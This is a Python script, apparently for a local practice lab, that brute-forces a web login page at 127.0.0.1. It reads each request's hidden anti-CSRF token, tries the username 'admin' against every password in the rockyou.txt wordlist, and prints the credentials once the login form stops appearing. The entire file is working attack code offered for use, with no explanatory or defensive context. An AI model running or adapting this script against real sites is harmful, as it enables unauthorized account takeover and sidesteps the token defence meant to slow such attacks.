from datetime import datetime
import requests
import re
from colorama import Fore, Style

url = 'http://127.0.0.1/login.php'
tokenRegex = "type='hidden' name='user_token' value='(\w+)'"
loginPageId = '<input type="submit" value="Login" name="Login">'
username = 'admin'
session = requests.Session()

print('-- Start script --\n')

def send(password: str) -> bool:
    firstGet = session.get(url)
    token = re.search(tokenRegex, firstGet.text)
    headers = {'User-Agent': 'Mozilla/5.0'}
    payload = {
        'username': username,
        'password': password,
        'Login': 'Login',
        'user_token': token.group(1)
    }
    print(datetime.now(), f'-{Fore.LIGHTBLUE_EX}', payload, Style.RESET_ALL)
    response = session.post(url, data=payload, headers=headers, cookies=session.cookies)
    s = re.findall(loginPageId, response.text)

    if len(s) == 0:
        print(f'\n{Fore.GREEN}Username: ', username, ' | ', 'Password: ', password)
        return True

    return False


f = open("rockyou.txt", 'r')
for line in f:
    line = line.rstrip('\n')
    if send(line):
        print('-- Finished! -- \n')
        break
quit()
